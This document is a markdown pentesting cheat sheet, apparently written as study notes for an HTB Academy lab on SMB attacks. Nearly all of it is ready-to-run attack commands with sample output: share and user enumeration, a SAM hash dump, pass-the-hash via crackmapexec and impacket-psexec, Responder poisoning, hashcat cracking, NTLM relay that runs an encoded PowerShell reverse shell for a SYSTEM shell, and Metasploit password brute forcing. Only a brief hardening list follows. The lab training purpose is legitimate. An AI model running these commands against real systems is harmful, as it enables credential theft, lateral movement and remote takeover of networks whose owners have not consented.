# 🛰️ SMB Protocol Attacks

## 🔍 Overview

SMB (Server Message Block) is a protocol used for file sharing and inter-process communication over a network. It's commonly found in Windows environments, but also supported by other operating systems. This section outlines various attack vectors against the SMB protocol, including reconnaissance techniques, pass-the-hash attacks, forced authentication methods, and detection strategies.

---

## 🚀 Reconnaissance & Enumeration

### 1. Service Discovery
```bash
# Discover SMB services on network
nmap -p 445 --script smb-protocols 10.10.110.0/24

# Output highlights SMB version and status
Nmap scan report for WIN7BOX (10.10.110.17)
PORT   STATE SERVICE VERSION
445/tcp open  netbios-ssn Microsoft Windows 7 - 10 x86 (workgroup: WORKGROUP)

# Example of SMB shares discovery using enum4linux
enum4linux -U jurena -P 'Password123!' 10.10.110.17

# Enumerate user accounts and groups
crackmapexec smb 10.10.110.17 -u jurena -p 'Password123!'

# Output SAM account information
YouSMB    10.10.110.17  445  WIN7BOX  [+] Dumping SAM hashes
SMB    10.10.110.17  445  WIN7BOX  Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
SMB    10.10.110.17  445  WIN7BOX  jurena:1001:aad3b435b51404eeaad3b435b51404ee:209c6174da490caeb422f3fa5a7ae634:::
```

### 2. Pass-the-Hash (PtH) Attacks
```bash
# Authenticate using NTLM hash instead of password
crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE

# PtH with Impacket tools
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe administrator@10.10.110.17
```

### 3. Logged-on Users Enumeration
```bash
# Find logged-on users across network
crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users

# Output shows active sessions for lateral movement targeting
SMB    10.10.110.17  445  WIN7BOX  WIN7BOX\jurena    logon_server: WIN7BOX
SMB    10.10.110.21  445  WIN10BOX WIN10BOX\demouser logon_server: WIN10BOX
```

---

## 📢 Forced Authentication Attacks

### 1. Responder - LLMNR/NBT-NS Poisoning

#### Setup Responder
```bash
# Start Responder on interface
sudo responder -I ens33

# Services automatically enabled:
# - LLMNR, NBT-NS, MDNS poisoning
# - Fake SMB, HTTP, HTTPS servers
# - Kerberos, SQL, FTP servers
```

#### Attack Scenario
```
1. User mistypes share name: \\mysharefoder\ instead of \\mysharedfolder\
2. Name resolution fails
3. Machine sends multicast query
4. Responder responds with attacker IP
5. Victim connects to fake SMB server
6. NetNTLMv2 hash captured
```

#### Captured Credentials Example
```
[SMB] NTLMv2-SSP Client   : 10.10.110.17
[SMB] NTLMv2-SSP Username : WIN7BOX\demouser
[SMB] NTLMv2-SSP Hash     : demouser::WIN7BOX:997b18cc61099ba2:3CC46296B0CCFC7A231D918AE1DAE521:...
```

### 2. Hash Cracking
```bash
# Crack NetNTLMv2 with hashcat
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt

# Example successful crack
ADMINISTRATOR::WIN-487IMQOIA8E:997b18cc61099ba2:...:P@ssword
```

### 3. NTLM Relay Attacks

#### Setup NTLM Relay
```bash
# Disable SMB in Responder config
cat /etc/responder/Responder.conf | grep 'SMB ='
SMB = Off

# Setup relay to target
impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146
```

#### Advanced Relay with Commands
```bash
# Execute PowerShell reverse shell via relay
impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 \
-c 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0...'

# Result: NT AUTHORITY\SYSTEM shell
```

---

## 📝 Skills Assessment Examples

### Example 1: Share Discovery
**Task**: Find shared folder with READ permissions

```bash
# Use enum4linux to enumerate shares
enum4linux 10.129.203.6

# Look for share mappings
//10.129.203.6/GGJ    Mapping: OK, Listing: OK

# Answer: GGJ
```

### Example 2: Password Brute Force
**Task**: Find password for username "jason"

```bash
# Metasploit brute force
msfconsole -q
use auxiliary/scanner/smb/smb_login
set rhosts 10.129.167.224
set SMBUSER jason
set PASS_FILE ./pws.list
set stop_on_success true
run

# Success result
[+] 10.129.167.224:445 - Success: '.\jason:34c8zuNBo91!@28Bszh'
```

### Example 3: SSH Key Extraction
**Task**: Login via SSH and find flag

```bash
# Access SMB share with found credentials
smbclient -U jason //10.129.137.91/GGJ

# Download SSH key
smb: \> get id_rsa
smb: \> exit

# Set permissions and connect
chmod 600 id_rsa
ssh -i id_rsa jason@10.129.137.91

# Find flag
cat flag.txt
# HTB{...}
```

---

## 🛡️ Defense & Mitigation

### SMB Security Hardening
- **Disable SMBv1** protocol
- **Enable SMB signing** (mandatory)
- **Restrict anonymous access**
- **Implement strong authentication**
- **Monitor SMB traffic**
- **Segment network** properly

### Detection Strategies
- **Monitor failed authentication attempts**
- **Alert on suspicious SMB connections**
- **Track administrative share access**
- **Log RPC operations**
- **Detect LLMNR/NBT-NS traffic**

---

## 🔗 Related Techniques

- **[[SMB Enumeration]]** - Information gathering techniques
- **[[Pass the Hash]]** - Credential reuse attacks
- **[Network Services](../services/)** - Other protocol attacks
- **[[Active Directory Attacks]]** - Domain exploitation

---

## 📚 References

- **HTB Academy** - Attacking Common Services Module
- **Impacket Documentation** - Python SMB tools
- **CrackMapExec Wiki** - Advanced SMB testing
- **Responder Documentation** - LLMNR/NBT-NS poisoning
- **Microsoft SMB Protocol** - Official specifications